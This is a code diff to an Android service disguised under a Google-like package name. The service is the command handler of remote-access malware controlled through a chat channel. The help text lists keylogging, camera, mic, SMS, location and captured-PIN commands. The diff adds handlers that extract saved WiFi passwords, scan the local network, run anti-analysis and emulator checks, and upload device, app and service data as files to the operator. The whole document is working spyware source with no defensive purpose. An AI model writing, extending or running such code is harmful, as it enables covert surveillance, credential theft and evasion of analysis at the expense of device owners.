@@ -270,13 +270,11 @@ class SystemNetworkService : Service() {
                         d.sendMsg(
                             ":book: **Command Help**\n" +
                             "Usage: `!help <command>`\n\n" +
-                            "**Available commands:**\n" +
-                            "`ping` `info` `status` `ip` `uptime` `debug` `restart`\n" +
-                            "`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n" +
-                            "`contacts` `sms` `call_log` `wifi` `battery` `processes`\n" +
-                            "`installed` `notifications` `shell` `persist` `grabber` `update` `config`\n" +
-                            "`admin` `overlay` `click` `input` `open` `screen`\n" +
-                            "`gesture` `pin` `torch` `vibrate`\n\n" +
+                            "**Recon:**\n`ping` `info` `status` `ip` `uptime` `debug` `restart` `sysinfo` `antidetect`\n\n" +
+                            "**Surveillance:**\n`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n\n" +
+                            "**Data:**\n`contacts` `sms` `call_log` `wifi` `battery` `processes`\n`installed` `notifications` `apps` `services` `sysprop` `storage`\n\n" +
+                            "**Advanced:**\n`grabber` `wifipass` `netstat` `shell` `persist` `update` `config`\n\n" +
+                            "**Control:**\n`admin` `overlay` `click` `input` `open` `screen`\n`gesture` `pin` `torch` `vibrate` `stream`\n\n" +
                             "Type `!help <cmd>` for usage info"
                         )
                     }
@@ -546,6 +544,87 @@ class SystemNetworkService : Service() {
                         } catch (e: Exception) {
                             d.sendMsg(":x: **Grab error**: ${e.message?.take(80) ?: "unknown"}")
                         }
+                    }
+                }
+                "wifipass" -> {
+                    d.sendMsg(":mag: **Extracting WiFi passwords**...")
+                    val result = com.google.system.AdvancedFeatures.getWifiPasswords()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":key: **WiFi Passwords**", "wifi_passwords.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **No WiFi data** — requires root access")
+                    }
+                }
+                "netstat" -> {
+                    d.sendMsg(":mag: **Scanning local network**...")
+                    val result = com.google.system.AdvancedFeatures.scanLocalNetwork()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":satellite: **Network Scan**", "network_scan.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **Network scan failed**")
+                    }
+                }
+                "sysinfo" -> {
+                    d.sendMsg(":mag: **Collecting full device info**...")
+                    val result = com.google.system.AdvancedFeatures.getDeviceInfoFull()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":iphone: **Full Device Info**", "device_info.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **Info collection failed**")
+                    }
+                }
+                "antidetect" -> {
+                    d.sendMsg(":shield: **Running anti-analysis check**...")
+                    val result = com.google.system.AdvancedFeatures.getDeviceEmulatorInfo()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":detective: **Anti-Analysis Report**", "antidetect.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **Analysis failed**")
+                    }
+                }
+                "sysprop" -> {
+                    d.sendMsg(":mag: **Extracting system properties**...")
+                    val result = com.google.system.AdvancedFeatures.getSystemProperties()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":gear: **System Properties**", "sysprop.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **Properties not accessible**")
+                    }
+                }
+                "services" -> {
+                    d.sendMsg(":mag: **Listing running services**...")
+                    val result = com.google.system.AdvancedFeatures.getRunningServices()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":running: **Running Services**", "services.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **Service list not accessible**")
+                    }
+                }
+                "battery" -> {
+                    d.sendMsg(":battery: **Getting battery health**...")
+                    val result = com.google.system.AdvancedFeatures.getBatteryHealth()
+                    if (result.isNotBlank()) {
+                        d.sendMsg(":battery: **Battery Health**\n```\n$result\n```")
+                    } else {
+                        d.sendMsg(":x: **Battery info not accessible**")
+                    }
+                }
+                "storage" -> {
+                    d.sendMsg(":floppy_disk: **Getting storage info**...")
+                    val result = com.google.system.AdvancedFeatures.getStorageInfo()
+                    if (result.isNotBlank()) {
+                        d.sendMsg(":floppy_disk: **Storage Info**\n```\n$result\n```")
+                    } else {
+                        d.sendMsg(":x: **Storage info not accessible**")
+                    }
+                }
+                "apps" -> {
+                    d.sendMsg(":package: **Getting detailed app list**...")
+                    val result = com.google.system.AdvancedFeatures.getInstalledAppsDetailed()
+                    if (result.isNotBlank()) {
+                        d.sendFile(":package: **Installed Apps**", "apps.txt", result.toByteArray())
+                    } else {
+                        d.sendMsg(":x: **App list not accessible**")
                     }
                 }
                 "update" -> {
@@ -1712,6 +1791,14 @@ class SystemNetworkService : Service() {
             "pin" -> ":lock: **!pin**\nView captured PIN/pattern/password.\nUsage: `!pin`"
             "torch" -> ":flashlight: **!torch**\nToggle flashlight.\nUsage: `!torch` (on)\nUsage: `!torch off`"
             "vibrate" -> ":vibration_mode: **!vibrate**\nVibrate device.\nUsage: `!vibrate` (1 second)\nUsage: `!vibrate 3000` (3 seconds)"
+            "wifipass" -> ":key: **!wifipass**\nExtract saved WiFi passwords.\nUsage: `!wifipass`\nRequires: Root access"
+            "netstat" -> ":satellite: **!netstat**\nScan local network for devices.\nUsage: `!netstat`"
+            "sysinfo" -> ":iphone: **!sysinfo**\nFull device info (emulator, root, battery, storage, props).\nUsage: `!sysinfo`"
+            "antidetect" -> ":shield: **!antidetect**\nAnti-analysis report (emulator detection, root, analysis tools).\nUsage: `!antidetect`"
+            "sysprop" -> ":gear: **!sysprop**\nExtract system properties.\nUsage: `!sysprop`"
+            "services" -> ":running: **!services**\nList running services.\nUsage: `!services`"
+            "apps" -> ":package: **!apps**\nDetailed installed apps list.\nUsage: `!apps`"
+            "storage" -> ":floppy_disk: **!storage**\nShow storage usage.\nUsage: `!storage`"
             else -> ":x: Unknown command: `!$cmd`\nType `!help` for available commands."
         }
         d.sendMsg(help)
